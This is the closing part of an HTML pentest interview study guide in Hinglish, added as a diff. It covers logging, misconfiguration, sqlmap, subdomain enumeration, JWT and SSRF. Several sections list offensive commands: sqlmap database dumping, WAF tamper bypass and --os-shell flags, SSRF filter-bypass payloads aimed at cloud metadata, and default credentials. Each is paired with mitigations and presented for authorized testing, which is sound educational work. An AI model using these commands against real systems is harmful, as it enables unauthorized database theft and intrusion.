+<li>Shodan: <code>shodan search ssl:target.com</code> — exposed services.</li>
+<li>Wayback: <code>waybackurls target.com</code> — old endpoints/params.</li>
+<li>Emails: <code>theHarvester -d target.com -b all</code>.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>GitHub search se company ka .env (DB creds) leaked commit mila — direct DB access. Lesson: secret scanning + rotation + employee training on public repos.</div>
+</section>
+
+<section class="topic" id="t41">
+<h2><span class="n">41</span>Logging &amp; Monitoring — Why A09 Matters</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>OWASP A09: Security Logging &amp; Monitoring Failures. <b>Log what:</b> auth events (login success/fail, lockout), privilege changes, admin actions, data access, errors (sanitized), anomalies. <b>Don't log:</b> passwords, tokens, OTPs, full credit cards (PCI), PII unnecessarily. <b>Monitoring:</b> SIEM aggregation, alert rules (N failed logins, new admin, outbound to unknown IP, WAF hits, honeypot touch), dashboards, IR runbooks. <b>Why:</b> detection time = breach impact (2023 avg ~200+ days); without logs, attacks invisible + compliance failures (PCI, GDPR).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>No logging = breach months unnoticed, no forensic evidence, regulatory fines. Log injection (CRLF in logs) bhi attack surface.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Centralized logging (ELK/Splunk) with log integrity (immutable/WORM).</li>
+<li>Alert rules on critical events + 24x7 monitoring (SOC).</li>
+<li>Sanitize logs: encode newlines, never log secrets.</li>
+<li>Retention policy + access control on logs (sensitive data).</li>
+<li>Test incident response with tabletop exercises.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Login brute karo — log entry + alert aata hai? (SIEM check).</li>
+<li>Admin action log: kya log hua (who/what/when)?</li>
+<li>Log injection: username mein CRLF daalo — log mein fake entry?</li>
+<li>Log exposure: /logs, /debug endpoints public? error pages stack leak?</li>
+<li>Retention: logs kitne din? tamper-proof hai? (append-only).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Company ko 6 mahine baad pata chala breach — kyunki auth logs nahi the; SIEM + alerting add karne ke baad brute-force attempts 15 min mein detect hue. Fix: centralized logging + alerting.</div>
+</section>
+
+<section class="topic" id="t42">
+<h2><span class="n">42</span>Security Misconfiguration (OWASP A05)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Default/insecure configs: <b>default credentials</b> (admin/admin), <b>directory listing</b> on, <b>verbose errors</b> (stack traces, DB errors), <b>unnecessary services/features</b> enabled, <b>sample files</b> (/phpmyadmin, /examples), <b>missing security headers</b>, <b>unpatched software</b>, <b>open cloud storage</b> (S3 bucket public), <b>debug modes</b> (DEBUG=True in prod), <b>CORS misconfig</b>, <b>TLS misconfig</b>, <b>info disclosure</b> (Server header, version banners), <b>default pages</b> (Tomcat/nginx default).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Easiest entry point — default creds = instant access; open S3 = data breach; verbose errors = recon goldmine; missing headers = XSS/clickjacking enabled.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Hardening baselines (CIS) + automated config scanning.</li>
+<li>Change all default credentials; disable unused features/services.</li>
+<li>Environment-specific configs: debug off in prod, minimal error pages.</li>
+<li>Security headers default template (HSTS, CSP, XFO, nosniff).</li>
+<li>Cloud: S3/Storage ACL audit, IaC security scanning (tfsec/Checkov).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Default creds: admin/admin, tomcat/tomcat, root/toor test karo.</li>
+<li>Directory listing: /uploads/, /images/, /backup/ kholo.</li>
+<li>Verbose errors: invalid input daal kar stack trace/DB error dekho.</li>
+<li>Headers: security header checklist (Part 1 topic 6).</li>
+<li>S3: <code>aws s3 ls s3://bucket</code> — public bucket test (authorized).</li>
+<li>Debug: DEBUG=True, /actuator (Spring Boot), /console (H2).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Spring Boot app par /actuator public — heapdump download se DB creds + tokens mil gaye. Fix: disable actuator in prod + auth + patching.</div>
+</section>
+
+<section class="topic" id="t43">
+<h2><span class="n">43</span>HTTP vs HTTPS — Why Sites Should Be HTTPS-Only</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>HTTP = plaintext (data wire par readable — MITM sniffing); HTTPS = TLS encrypted (confidentiality + integrity + server identity). <b>Why HTTPS-only:</b> login credentials/PII/tokens otherwise steal-able (evil twin WiFi, ISP, router compromise); tampering (injected ads/malware — ISP/content injection); session hijacking (session cookie sniff); SEO ranking + browser "Not Secure" warning trust loss; compliance (PCI/GDPR). HSTS ensures browser forces HTTPS even after first visit.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>HTTP = MITM credential theft, session hijack, content injection/malware. SSL strip downgrade attacks bhi tabhi possible jab HTTPS optional ho.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Redirect all HTTP → HTTPS (301) at server/load balancer.</li>
+<li>HSTS with includeSubDomains + preload.</li>
+<li>Disable HTTPS downgrade options; no mixed content.</li>
+<li>Valid certs everywhere (all subdomains).</li>
+<li>Secure cookies (Secure flag) — HTTP par kabhi na bhejein.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>HTTP open karo — HTTPS par redirect hota hai? (301).</li>
+<li>Mixed content: HTTPS page par HTTP resources load hote hain?</li>
+<li>Cookie Secure flag: HTTP request mein cookie aati hai? (shouldn't).</li>
+<li>HSTS header: max-age + includeSubDomains present?</li>
+<li>SSL strip test: bettercap/downgrade attempt (authorized lab) — HSTS blocks?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Hotel WiFi par HTTP login page — attacker sniffed credentials. Fix: HTTPS-only + HSTS + Secure cookies — ab sniffed traffic encrypted ciphertext hai.</div>
+</section>
+
+<section class="topic" id="t44">
+<h2><span class="n">44</span>sqlmap — Flags &amp; Automation</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>sqlmap = automated SQLi tool. <b>Basic:</b> <code>sqlmap -u "http://target/page?id=1" --batch</code>; <b>POST:</b> <code>-u url --data "user=admin&pass=test"</code>; <b>Headers/cookies:</b> <code>--headers="Cookie: session=x"</code>, <code>--cookie</code>; <b>Techniques:</b> <code>--technique=BEUSTQ</code> (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline); <b>DB dump:</b> <code>--dbs --tables -D db -T users --dump</code>; <b>Level/risk:</b> <code>--level=5 --risk=3</code>; <b>Tamper scripts (WAF bypass):</b> <code>--tamper=space2comment,base64encode</code>; <b>Proxy:</b> <code>--proxy=http://127.0.0.1:8080</code> (Burp integration); <b>OS shell:</b> <code>--os-shell</code> (needs FILE/xp_cmdshell).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Fast exploitation of SQLi — full DB dump, OS shell. Manual techniques (Part 1 topic 12) pehle aani chahiye; sqlmap validation/automation ke liye.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Parameterized queries (root fix) — sqlmap bekaar ho jata hai.</li>
+<li>WAF + egress filtering (OOB roko).</li>
+<li>Least-privilege DB user (no FILE/stacked).</li>
+<li>Monitor: sqlmap signature requests (anomaly detection).</li>
+<li>Patch DBMS + disable dangerous features.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Basic: <code>sqlmap -u "http://t/page.php?id=1" --batch --dbs</code>.</li>
+<li>Auth: <code>--cookie "PHPSESSID=..." --headers "X-API: key"</code>.</li>
+<li>POST: <code>--data "search=test" -p search</code> — parameter specific.</li>
+<li>WAF bypass: <code>--tamper=between,space2randomblank --level=5</code>.</li>
+<li>Dump: <code>-D app -T users --dump --threads 4</code>.</li>
+<li>Time-only: <code>--technique=T --time-sec=3</code>.</li>
+<li>Proxy + Burp: <code>--proxy=http://127.0.0.1:8080</code> — traffic log + tamper.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Manual boolean-based SQLi mila → sqlmap se DB enum → 4M user records dump (limited sample for PoC) → report Critical + parameterization fix.</div>
+</section>
+
+<section class="topic" id="t45">
+<h2><span class="n">45</span>Subdomain Enumeration — Techniques &amp; Tools</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Techniques: <b>passive</b> — certificate transparency (crt.sh, Censys), search engines, DNS datasets (SecurityTrails), subfinder/amass passive, VirusTotal; <b>active</b> — wordlist brute on DNS (dnsrecon, gobuster dns, ffuf), zone transfer attempt (rare), recursive resolution, permutation (altdns — dev-, staging-, beta-); <b>validation</b> — httpx (alive + title + tech), nuclei scans, port scan interesting hosts. Output: subdomain list → takeover check (topic 11) → attack surface mapping (admin panels, staging, APIs).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Hidden subdomains = forgotten apps (staging/dev) — usually weaker security, higher vuln rate; takeover opportunities; bigger attack surface.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Central DNS registry — know all subdomains.</li>
+<li>Remove dangling CNAMEs (takeover prevention).</li>
+<li>Put staging/dev behind VPN/auth — not public.</li>
+<li>Monitor new subdomains (external attack surface management).</li>
+<li>Wildcard DNS policy + DNSSEC.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Passive: <code>subfinder -d target.com -all</code>; crt.sh: <code>curl "https://crt.sh/?q=%25.target.com&amp;output=json"</code>.</li>
+<li>Active: <code>dnsrecon -d target.com -t brt -D subdomains.txt</code>.</li>
+<li>Permutation: <code>altdns -i subs.txt -o perms.txt -w words.txt</code>.</li>
+<li>Validate: <code>httpx -l subs.txt -title -status-code -tech-detect</code>.</li>
+<li>Priority: staging/admin/api hosts par VAPT focus karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>crt.sh se staging.target.com mila — staging par admin panel with default creds → production DB replica accessible. Lesson: subdomain recon = hidden crown jewels.</div>
+</section>
+
+<section class="topic" id="t46">
+<h2><span class="n">46</span>CAPTCHA vs 2FA — Differences</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>CAPTCHA</b> = bot/human discrimination (Turing test) — automated traffic rokti hai (brute-force, spam); sirf "not a bot" proof. <b>2FA/MFA</b> = identity verification with second factor (something you have/know/are) — proves "you are the claimed user". <b>Difference:</b> CAPTCHA ≠ authentication; it's bot mitigation (A07-adjacent, not identity). CAPTCHA can supplement 2FA (protect OTP endpoints from automated brute), but never replaces it. Bypasses: CAPTCHA OCR, solver services (2captcha), audio bypass, replay of CAPTCHA response, human farms; 2FA bypass: topic 32 Part 1.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>CAPTCHA-only = still one factor (password) — stolen creds = full access; 2FA adds real layer. CAPTCHA bypass = automated abuse resumes.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Use CAPTCHA for bot control + 2FA for identity — dono alag jobs.</li>
+<li>2FA: TOTP/WebAuthn (hardware keys) over SMS where possible.</li>
+<li>Rate limit + lockout + CAPTCHA escalation on login/OTP endpoints.</li>
+<li>Modern CAPTCHA: reCAPTCHA v3 score, invisible, behavioral.</li>
+<li>Server-side verify CAPTCHA response; never trust client flag.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>CAPTCHA bypass: response replay karo (same token reuse) — accepted?</li>
+<li>CAPTCHA missing on OTP/brute-prone endpoints?</li>
+<li>2FA bypass: Part 1 topic 32 test cases apply karo.</li>
+<li>reCAPTCHA score: <code>score &lt; 0.5</code> — actions blocked? (server config).</li>
+<li>Session: CAPTCHA solve ke baad token expiry + rate limit active?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Client ne CAPTCHA ko "2FA" bol raha tha — actually sirf bot check tha; password leaked hone par account full access. Fix: real TOTP 2FA + CAPTCHA sirf brute prevention.</div>
+</section>
+
+<section class="topic" id="t47">
+<h2><span class="n">47</span>API Gateway — Security Considerations</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>API Gateway = microservices ke saamne single entry (Kong, AWS API Gateway, Nginx, Envoy, KrakenD). <b>Security features:</b> authentication (API keys, OAuth/JWT), authorization policies, rate limiting (per key/user), request validation (schema, size, content-type), TLS termination + pinning, IP allow/deny lists, logging/monitoring, request transformation (header stripping — remove internal headers), WAF integration, circuit breaking, CORS policy centralization. <b>Considerations:</b> gateway bypass (direct service access), misconfig (wildcard routes, open CORS, no auth on some routes), secret sprawl (keys in gateway config), logging sensitive data, DoS on gateway, versioning/path confusion.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Gateway secure = services protected centrally; gateway misconfig = single point of mass compromise (auth bypass on all APIs).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Defense in depth: gateway auth + service-level auth (both).</li>
+<li>Least privilege routes: explicit route allowlist, deny unknown.</li>
+<li>Centralized rate limit + quotas + anomaly alerts.</li>
+<li>No secrets in gateway configs (Vault/KMS); rotate keys.</li>
+<li>Audit: gateway logs + config reviews + penetration testing.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Bypass: service direct IP/port se accessible? (gateway sirf entry hai?).</li>
+<li>Route wildcard: <code>/api/*</code> bina auth route exist karta hai?</li>
+<li>Path confusion: <code>/admin</code> vs <code>//admin</code>, <code>/api/../admin</code> — gateway routing differ?</li>
+<li>CORS central policy: origin allowlist strict hai? credentials allowed?</li>
+<li>Rate limit: key rotate karke limit bypass hota hai? XFF spoof?</li>
+<li>Header leakage: internal headers (X-Internal, X-Forwarded) client ko expose hote hain?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Kong gateway par ek route <code>/internal/*</code> bina auth tha — attacker ne usse admin-service calls kiye. Fix: route allowlist + service-level auth + audit.</div>
+</section>
+
+<section class="topic" id="t48">
+<h2><span class="n">48</span>JWT vs Normal Session Tokens — Why JWT Is Recommended</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Session tokens (opaque):</b> random string, server-side store (Redis/DB), lookup per request — easy revocation, stateful. <b>JWT:</b> self-contained signed claims (header.payload.signature), stateless — no server lookup; carries user info/roles/scopes directly. <b>Why JWT recommended:</b> <b>1. Stateless/scalable</b> — no session store, horizontal scaling easy (microservices share verification via JWKS); <b>2. Cross-domain</b> — OAuth/OIDC, SSO, mobile + web + third-party; <b>3. Self-contained</b> — claims available without DB round-trip (perf); <b>4. Signed</b> — tamper-proof (if verified properly); <b>5. Standard</b> — ecosystem (libraries, JWKS). <b>Costs:</b> revocation hard (stateless) — solve via short expiry + refresh tokens + denylist; bigger token size.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Sahi use = scalable secure auth; galat use (alg:none, weak secret, no exp) = auth bypass (Part 1 topic 33).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>RS256/ES256 + strict alg allowlist + full validation (exp/iss/aud).</li>
+<li>Short-lived access tokens (5-15 min) + rotating refresh tokens.</li>
+<li>Server-side denylist/revocation for high-risk events.</li>
+<li>Never store JWT in localStorage — HttpOnly cookie/memory.</li>
+<li>Rotation + key management (JWKS, kid allowlist).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Compare: JWT stateless check — logout ke baad bhi token valid? (revocation test).</li>
+<li>alg:none / weak secret / exp tamper — Part 1 topic 33 cases.</li>
+<li>Token storage: localStorage mein JWT? XSS se steal possible?</li>
+<li>Refresh rotation: refresh token reuse detect hota hai?</li>
+<li>Scopes: token mein admin scope — endpoint validate karta hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Microservices SSO ne JWT choose kiya — services bina session store ke JWKS se verify karti hain; attack surface: JWT attacks — isliye short expiry + rotation + denylist lagaye.</div>
+</section>
+
+<section class="topic" id="t49">
+<h2><span class="n">49</span>DNS Sinkhole &amp; SSRF Bypass Techniques</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>DNS sinkhole:</b> malicious domain ko resolve karke internal honeypot/block page par bhejna (Pi-hole, enterprise DNS, RPZ) — malware C2, ads, known-bad domains blocked. Testing side: sinkhole detection = environment filtering pata chalta hai. <b>SSRF bypass (in context of filters/sinkholes):</b> URL parser tricks — <code>http://2130706433/</code> (decimal IP), <code>0x7f000001</code> (hex), <code>http://[::1]</code> (IPv6), <code>http://127.1/</code> (short), <code>@</code> tricks (<code>http://evil.com@127.0.0.1</code>), redirect-based (302 → internal), DNS rebinding (attacker domain pehle public IP, phir internal resolve), <code>localhost.evil.com</code>, Unicode/encoding, URL normalization differences between filter and fetcher.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Sinkholes = C2/malware access blocking (defense). SSRF bypass = internal services + metadata access despite filters (attack).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>SSRF: allowlist + resolved-IP validation + no redirects + pin DNS (rebinding roko).</li>
+<li>Block private/link-local ranges (127/8, 10/8, 172.16/12, 192.168/16, 169.254.169.254).</li>
+<li>Egress filtering (sinkhole DNS + firewall) — OOB exfil block.</li>
+<li>IMDSv2 + network policy (metadata protection).</li>
+<li>WAF + anomaly detection on fetch behaviors.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Sinkhole: Pi-hole/RPZ set karo — malicious domain resolve hota hai? (blocked page?).</li>
+<li>SSRF encoded: <code>http://2130706433/</code>, <code>0x7f000001</code>, <code>127.1</code>, <code>[::1]</code> try karo.</li>
+<li>Redirect bypass: attacker server 302 → 169.254.169.254 — fetcher follow karta hai?</li>
+<li>DNS rebinding: rebind.network domain use karke internal IP resolve (lab).</li>
+<li>Metadata: IMDSv2 token required? <code>PUT /latest/api/token</code> — block hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Enterprise DNS sinkhole ne C2 domain block kiya → ransomware beacon fail hua. SSRF test: decimal IP encoding se metadata endpoint hit hua kyunki filter sirf "169.254" string check karta tha.</div>
+</section>
+
+<!-- ==================== REVISION ==================== -->
+<h3 class="category">Revision</h3>
+
+<section class="topic" id="t50">
+<h2><span class="n">50</span>Quick Revision Cheat Sheet (One-Liners)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Open vs Closed vs Filtered:</b> service hai / nahi hai / firewall drop. <b>Bind vs Reverse:</b> inbound connect vs outbound connect. <b>Wireshark vs Burp:</b> wire ciphertext vs MITM plaintext. <b>MD5:</b> fast + collisions → never for passwords. <b>CAPTCHA vs 2FA:</b> bot check vs identity factor. <b>JWT:</b> stateless signed claims; attacks: alg:none, weak secret, exp. <b>Nessus:</b> VA scanner — credentialed + FP triage. <b>Thick client:</b> memory dump, DLL hijack, client-side logic. <b>SDLC:</b> security har phase mein (shift-left). <b>OSI:</b> 7 layers, attacks har layer par. <b>Root bypass tools:</b> Magisk, Frida, objection, Xposed. <b>iOS:</b> Swift new, ObjC legacy; Keychain over UserDefaults.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Interview mein yeh one-liners fast recall dete hain — details ke liye relevant topics upar padho.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Har cheat line ko detail topic se link karo (search box use karo).</li>
+<li>Practice: khud ko 5-min mein 10 topics samjhao.</li>
+<li>Part 1 + Part 2 dono ka search + print PDF bana lo.</li>
+<li>Real-world scenarios yaad karo (har topic ka .sc section).</li>
+<li>Mock interview: scenario questions ka jawab loud bol kar practice karo.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Flashcards: har topic ka naam + ek-line definition likho.</li>
+<li>Pair practice: ek doosre se scenario pucho (e.g., "Wireshark mein encrypted kyun?").</li>
+<li>Whiteboard: OSI layers + bind/reverse diagram banao.</li>
+<li>Tool demo: kal ek lab mein nmap + sqlmap + Burp flow run karo.</li>
+<li>Self-review: weak topics search box mein filter karke dobara padho.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Interviewer: "Ek aisa finding batao jo critical tha" → Answer: SSRF via decimal IP → cloud metadata → IAM keys. Mitigation: allowlist + IMDSv2 + egress filtering. (Detailed: topic 49 + Part 1 topic 39.)</div>
+</section>
+
+</main>
+</div>
+
+<footer>Pentest Interview Master Guide — Part 2 · Network, Process, Mobile OS &amp; Misc · Open part2.html in browser</footer>
+
+<script>
+const q=document.getElementById('q'),count=document.getElementById('count');
+const topics=Array.from(document.querySelectorAll('.topic'));
+const cats=Array.from(document.querySelectorAll('.category'));
+const navLinks=Array.from(document.querySelectorAll('nav a'));
+function update(){
+  const t=q.value.toLowerCase().trim();
+  let vis=0;
+  topics.forEach(tp=>{
+    const show=!t||tp.textContent.toLowerCase().includes(t);
+    tp.style.display=show?'':'none';
+    if(show)vis++;
+  });
+  cats.forEach(c=>{
+    let any=false;
+    topics.forEach(tp=>{
+      if(tp.style.display!=='none'&&tp.previousElementSibling===c)any=true;
+    });
+    c.style.display=any?'':'none';
+  });
+  navLinks.forEach(a=>{
+    const id=a.getAttribute('href').slice(1);
+    const tp=document.getElementById(id);
+    a.style.display=(tp&&tp.style.display!=='none')?'':'none';
+  });
+  count.textContent=vis+' topics';
+}
+q.addEventListener('input',update);
+</script>
+</body>
+</html>
